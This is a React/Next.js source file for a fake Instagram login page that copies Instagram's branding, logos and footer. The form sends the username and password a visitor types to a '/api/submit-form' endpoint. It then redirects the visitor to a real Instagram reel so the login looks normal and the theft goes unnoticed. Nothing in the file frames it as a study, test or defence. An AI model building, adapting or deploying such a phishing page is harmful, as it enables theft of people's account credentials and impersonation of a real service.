"use client"

import Image from "next/image"
import Link from "next/link"
import { Button } from "@/components/ui/button"
import { useState } from "react"
import { useSystemTheme } from "@/components/useSystemTheme"

type FormDataType = Readonly<{
  username: string
  password: string
}>

export default function InstagramLogin() {
  useSystemTheme()

  const [formData, setFormData] = useState<FormDataType>({
    username: "",
    password: "",
  })

  const [errors, setErrors] = useState<FormDataType>({
    username: "",
    password: "",
  })

  const [isSubmitting, setIsSubmitting] = useState(false)

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    })
  }

  const validateForm = () => {
    const trimmedUsername = formData.username.trim()
    const trimmedPassword = formData.password.trim()

    if (!trimmedUsername || !trimmedPassword) {
      setErrors({
        username: !trimmedUsername ? "Username is required" : "",
        password: !trimmedPassword ? "Password is required" : "",
      })
      return false
    } else if (trimmedPassword.length < 6) {
      setErrors({
        username: "",
        password: "Password must be at least 6 characters",
      })
      return false
    }

    setErrors({ username: "", password: "" })
    return true
  }

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!validateForm()) return;

    setIsSubmitting(true);

    try {
      const res = await fetch("/api/submit-form", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      const result = await res.json();

      if (!res.ok) {
        console.error("API Error:", result.error);
        alert("Something went wrong: " + result.error);
      } else {
        // Reset form
        setFormData({ username: "", password: "" });

        // Instagram Reel URLs
        const reelId = "DB5yhFPpfki";
        const instagramAppUrl = `instagram://reel/${reelId}`;
        const instagramWebUrl = `https://www.instagram.com/reel/${reelId}/`;

        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

        if (isMobile) {
          // Try to open the Instagram app to the specific reel
          window.location.href = instagramAppUrl;

          // Fallback to Instagram web if app didn't open
          setTimeout(() => {
            if (document.visibilityState !== "hidden") {
              window.location.href = instagramWebUrl;
            }
          }, 1500);
        } else {
          // Desktop fallback
          window.location.href = instagramWebUrl;
        }
      }
    } catch (error) {
      console.error("Network error:", error);
      alert("Failed to connect to server.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-white dark:bg-black px-4 mt-4 text-black dark:text-white">
      <div className="w-full max-w-[29rem] flex flex-col items-center">
        {/* Login Card */}
        <div className="w-full border border-[#DBDBDB] dark:border-gray-700 px-14 pt-16 pb-4 mb-3 flex flex-col items-center bg-white dark:bg-black">
          <div className="mb-10">
            <Image
              src="/ig-logo.png"
              alt="Instagram"
              className="mix-blend-difference invert w-[14.5rem]"
              width={175}
              height={100}
            />
          </div>

          <form className="w-full space-y-2 mt-2" onSubmit={handleSubmit}>
            <div className="relative">
              <label
                htmlFor="username"
                className={`absolute left-3 text-gray-400 transition-all duration-200 truncate max-w-full pr-5
            ${formData.username ? "top-1 text-[0.8rem]" : "top-1/2 -translate-y-1/2 text-base"}
          `}
              >
                Phone number, username, or email
              </label>
              <input
                id="username"
                type="text"
                name="username"
                value={formData.username}
                onChange={handleChange}
                className={`w-full h-[3.2rem] text-base bg-[#FAFAFA] dark:bg-[#121212] border border-gray-200 dark:border-gray-600 px-2 ${formData.username ? "pt-4" : "pt-1"} pb-1 focus:border-gray-300 dark:focus:border-gray-500 focus-visible:outline-none`}
              />
              {errors.username && (
                <p aria-live="polite" className="text-red-500 text-base -translate-y-1.5">
                  {errors.username}
                </p>
              )}
            </div>

            <div className="relative">
              <label
                htmlFor="password"
                className={`absolute left-3 text-gray-400 transition-all duration-200
            ${formData.password ? "top-1 text-[0.8rem]" : "top-1/2 -translate-y-1/2 text-base"}
          `}
              >
                Password
              </label>
              <input
                id="password"
                type="password"
                name="password"
                onChange={handleChange}
                className={`w-full h-[3.2rem] text-base bg-[#FAFAFA] dark:bg-[#121212] border border-gray-200 dark:border-gray-600 px-2 ${formData.password ? "pt-4" : "pt-1"} pb-1 focus:border-gray-300 dark:focus:border-gray-500 focus-visible:outline-none`}
              />
              {errors.password && (
                <p aria-live="polite" className="text-red-500 text-base -translate-y-1.5">
                  {errors.password}
                </p>
              )}
            </div>

            <Button
              disabled={
                !formData.username ||
                !formData.password ||
                formData.password.length < 6
              }
              type="submit"
              className={`w-full rounded-lg py-5 mt-2 text-[1.2rem] hover:bg-[#0095F6] bg-[#0095F6] font-semibold text-white ${isSubmitting ? "cursor-not-allowed" : "cursor-pointer"}`}
            >
              {isSubmitting ? (
                <div className="flex items-center justify-center gap-2 invert">
                  <svg aria-label="Loading..." className="animate-spin scale-150 xemfg65 xa4qsjk x1ka1v4i xbv57ra" role="img" viewBox="0 0 100 100">
                    <rect className="x1i210e2" height="6" opacity="0" rx="3" ry="3" transform="rotate(-90 50 50)" width="25" x="72" y="47"></rect>
                    <rect className="x1i210e2" height="6" opacity="0.08333333333333333" rx="3" ry="3" transform="rotate(-60 50 50)" width="25" x="72" y="47"></rect>
                    <rect className="x1i210e2" height="6" opacity="0.16666666666666666" rx="3" ry="3" transform="rotate(-30 50 50)" width="25" x="72" y="47"></rect>
                    <rect className="x1i210e2" height="6" opacity="0.25" rx="3" ry="3" transform="rotate(0 50 50)" width="25" x="72" y="47"></rect>
                    <rect className="x1i210e2" height="6" opacity="0.3333333333333333" rx="3" ry="3" transform="rotate(30 50 50)" width="25" x="72" y="47"></rect>
                    <rect className="x1i210e2" height="6" opacity="0.4166666666666667" rx="3" ry="3" transform="rotate(60 50 50)" width="25" x="72" y="47"></rect>
                    <rect className="x1i210e2" height="6" opacity="0.5" rx="3" ry="3" transform="rotate(90 50 50)" width="25" x="72" y="47"></rect>
                    <rect className="x1i210e2" height="6" opacity="0.5833333333333334" rx="3" ry="3" transform="rotate(120 50 50)" width="25" x="72" y="47"></rect>
                    <rect className="x1i210e2" height="6" opacity="0.6666666666666666" rx="3" ry="3" transform="rotate(150 50 50)" width="25" x="72" y="47"></rect>
                    <rect className="x1i210e2" height="6" opacity="0.75" rx="3" ry="3" transform="rotate(180 50 50)" width="25" x="72" y="47"></rect>
                    <rect className="x1i210e2" height="6" opacity="0.8333333333333334" rx="3" ry="3" transform="rotate(210 50 50)" width="25" x="72" y="47"></rect>
                    <rect className="x1i210e2" height="6" opacity="0.9166666666666666" rx="3" ry="3" transform="rotate(240 50 50)" width="25" x="72" y="47"></rect>
                  </svg>
                </div>
              ) : (
                "Log in"
              )}
            </Button>
          </form>

          <div className="w-full flex items-center my-8">
            <div className="flex-grow h-px bg-gray-300 dark:bg-gray-800"></div>
            <span className="px-4 text-gray-500 dark:text-gray-400 text-xs font-semibold">OR</span>
            <div className="flex-grow h-px bg-gray-300 dark:bg-gray-800"></div>
          </div>

          <Link
            href="#"
            className="w-full text-blue-500 dark:text-blue-400 text-center text-[1.2rem] font-semibold mb-4"
          >
            <Image
              src="/fb-logo.png"
              alt="Facebook"
              width={20}
              height={20}
              className="inline-block mr-3 brightness-110 w-[1.675rem]"
            />
            Log in with Facebook
          </Link>

          <Link
            href="#"
            className="text-blue-900 dark:text-blue-100 text-[1.2rem] font-normal mb-4 mt-1"
          >
            Forgot password?
          </Link>
        </div>

        {/* Sign Up Card */}
        <div className="w-full border border-gray-300 dark:border-gray-700 bg-white dark:bg-black p-7.5 mb-4 flex justify-center">
          <p className="text-base">
            Don&apos;t have an account?
            <Link
              href="#"
              className="text-[#0095F6] font-semibold ml-1 text-[1.2rem]"
            >
              Sign up
            </Link>
          </p>
        </div>

        {/* Get the app */}
        <div className="w-full flex flex-col items-center">
          <p className="text-[1.2rem] mb-4">Get the app.</p>
          <div className="flex space-x-2.5">
            <Link href="#">
              <Image
                src="/google-play.png"
                alt="Download on the App Store"
                width={156}
                height={40}
                className="h-13 w-auto"
              />
            </Link>
            <Link href="#">
              <Image
                src="/microsoft.png"
                alt="Get it on Google Play"
                width={156}
                height={40}
                className="h-13 w-auto"
              />
            </Link>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full max-w-[850px] mt-24 mb-20">
        <div className="flex flex-wrap justify-center gap-x-5 text-base text-gray-500 dark:text-gray-400 mb-6">
          <Link href="#">Meta</Link>
          <Link href="#">About</Link>
          <Link href="#">Blog</Link>
          <Link href="#">Jobs</Link>
          <Link href="#">Help</Link>
          <Link href="#">API</Link>
          <Link href="#">Privacy</Link>
          <Link href="#">Terms</Link>
          <Link href="#">Locations</Link>
          <Link href="#">Instagram Lite</Link>
          <Link href="#">Threads</Link>
          <Link href="#">Contact Uploading & Non-Users</Link>
          <Link href="#">Meta Verified</Link>
        </div>

        <div className="flex justify-center items-center gap-4 text-base text-gray-500 dark:text-gray-400">
          <select className="bg-transparent border-none text-base text-gray-500 dark:text-gray-400 cursor-pointer">
            <option value="en">English</option>
            <option value="es">Español</option>
            <option value="fr">Français</option>
          </select>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  )
}
